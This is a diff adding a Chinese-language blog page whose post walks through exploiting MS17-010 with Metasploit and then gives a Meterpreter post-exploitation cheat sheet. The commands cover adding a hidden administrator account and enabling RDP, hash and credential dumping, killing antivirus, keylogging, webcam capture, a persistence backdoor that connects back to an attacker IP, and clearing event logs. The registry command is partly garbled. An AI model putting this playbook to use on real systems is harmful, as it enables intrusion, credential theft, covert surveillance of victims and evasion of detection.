@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>如何利用  ms17-010开始进行绳渗透测试 | seemH</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="shortcut icon" href="https://lhq159753.github.io/web.github.io//favicon.ico?v=1632310146595">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://lhq159753.github.io/web.github.io//styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+  </head>
+  <body>
+  
+    <nav class="navbar border fixed split-nav">
+  <div class="nav-brand">
+    <h3><a href="https://lhq159753.github.io/web.github.io/">seemH</a></h3>
+  </div>
+  <div class="collapsible">
+    <input id="collapsible1" type="checkbox" name="collapsible1">
+    <button>
+      <label for="collapsible1">
+        <div class="bar1"></div>
+        <div class="bar2"></div>
+        <div class="bar3"></div>
+      </label>
+    </button>
+    <div class="collapsible-body">
+      <ul class="inline">
+        
+          <li>
+            
+              <a href="https://lhq159753.github.io/web.github.io/" class="menu">
+                首页
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="https://lhq159753.github.io/lhq123.github.io/tags" class="menu">
+                归档
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="https://lhq159753.github.io/lhq123.github.io/archives" class="menu">
+                标签
+              </a>
+            
+          </li>
+        
+          <li>
+            
+              <a href="https://lhq159753.github.io/web.github.io/archives" class="menu">
+                关于
+              </a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div id="top" class="row site">
+      <div class="sm-12 md-8 col">
+        <div class="paper">
+          <article class="article">
+            <h1>如何利用  ms17-010开始进行绳渗透测试</h1>
+            <p class="article-meta">
+              2021-09-22
+              
+                <a href="https://lhq159753.github.io/web.github.io/tag/aEz4gYwfn/" class="badge secondary">
+                  漏洞利用
+                </a>
+              
+            </p>
+            
+              <img src="https://lhq159753.github.io/web.github.io//post-images/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi.jpg" alt="如何利用  ms17-010开始进行绳渗透测试">
+            
+            <div class="post-content">
+              <p>🕎</p>
+<figure data-type="image" tabindex="1"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310067918.jpg" alt="" loading="lazy"></figure>
+<pre><code>在进行渗透测试之前，先进行信息获取
+
+利用nmap -Pn 扫描目标主机是否有对应的端口开启
+进入msfconsole
+
+打开数据库：service postgresql start
+
+数据初始化：msfdb init
+
+信息收集获取目标机的IP地址
+
+使用msfsole攻击
+
+search：漏洞模块路径查询
+
+use：使用漏洞模块
+
+show options：加载攻击模块并配置参数
+
+set ：配置参数
+
+payload;攻击荷载
+
+RHOST：目标主机地址
+
+LHOST：本机主机地址
+
+run：执行
+
+ 渗透思维导图
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://lhq159753.github.io/web.github.io//post-images/1632310085495.png" alt="" loading="lazy"></figure>
+<pre><code>🏳️‍🌈🏳️‍🌈🏳️‍🌈  在使用 Meterpreter payload攻击模块下
+首先创建一个用户：net user +名字 +密码 /add
+把刚才创建的用户设置为管理员
+net localgroup administrators +名字 /add
+在卡里把win7的远程桌面服务打开
+C:\Windows\system32&gt;G ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWREORD /d 0 /f
+</code></pre>
+<p>然后在kali终端 打开rdesktop + 目标ip地址  ：3389</p>
+<p>🌲后期渗透<br>
+sysinfo             #查看目标主机系统信息<br>
+run scraper         #查看目标主机详细信息<br>
+run hashdump        #导出密码的哈希<br>
+load kiwi           #加载<br>
+ps                  #查看目标主机进程信息<br>
+pwd                 #查看目标当前目录(windows)<br>
+getlwd              #查看目标当前目录(Linux)<br>
+search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件<br>
+download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下<br>
+upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程<br>
+PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上<br>
+idletime            #查看主机运行时间<br>
+getuid              #查看获取的当前权限<br>
+getsystem           #提权<br>
+run  killav         #关闭杀毒软件<br>
+screenshot          #截图<br>
+webcam_list         #查看目标主机的摄像头<br>
+webcam_snap         #拍照<br>
+webcam_stream       #开视频<br>
+execute  参数  -f 可执行文件   #执行可执行程序<br>
+run getgui -u hack -p 123    #创建hack用户，密码为123<br>
+run getgui -e                #开启远程桌面<br>
+keyscan_start                #开启键盘记录功能<br>
+keyscan_dump                 #显示捕捉到的键盘记录信息<br>
+keyscan_stop                 #停止键盘记录功能<br>
+uictl  disable  keyboard     #禁止目标使用键盘<br>
+uictl  enable   keyboard     #允许目标使用键盘<br>
+uictl  disable  mouse        #禁止目标使用鼠标<br>
+uictl  enable   mouse        #允许目标使用鼠标<br>
+load                         #使用扩展库<br>
+run				             #使用扩展库<br>
+run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接<br>
+192.168.27的4444端口，缺点是容易被杀毒软件查杀<br>
+portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址<br>
+clearev                       #清除日志</p>
+<p>run post/windows/manage/migrate                  #自动进程迁移<br>
+run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上<br>
+run post/windows/manage/killav                   #关闭杀毒软件<br>
+run post/windows/manage/enable_rdp               #开启远程桌面服务<br>
+run post/windows/manage/autoroute                #查看路由信息<br>
+run post/windows/gather/enum_logged_on_users     #列举当前登录的用户<br>
+run post/windows/gather/enum_applications        #列举应用程序<br>
+run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码<br>
+run windows/gather/smart_hashdump                #dump出所有用户的hash</p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+        </div>
+        
+          
+            <div class="paper" data-aos="fade-in">
+              <div id="gitalk-container"></div>
+            </div>
+          
+
+          
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://lhq159753.github.io/web.github.io//images/avatar.png?v=1632310146595" class="no-responsive avatar">
+    <div class="text-muted">温故而知新</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+          <a href="https://www.zhihu.com/people/seem-21-16" target="_blank">
+            <i class="fab fa-zhihu"></i>
+          </a>
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://lhq159753.github.io/web.github.io/post/ru-he-li-yong-ms17-010-kai-shi-jin-xing-sheng-shen-tou-ce-shi/">如何利用  ms17-010开始进行绳渗透测试</a>
+            </li>
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://lhq159753.github.io/web.github.io/tag/aEz4gYwfn/" class="badge ">
+          漏洞利用
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://lhq159753.github.io/web.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: '',
+        owner: '',
+        admin: [''],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
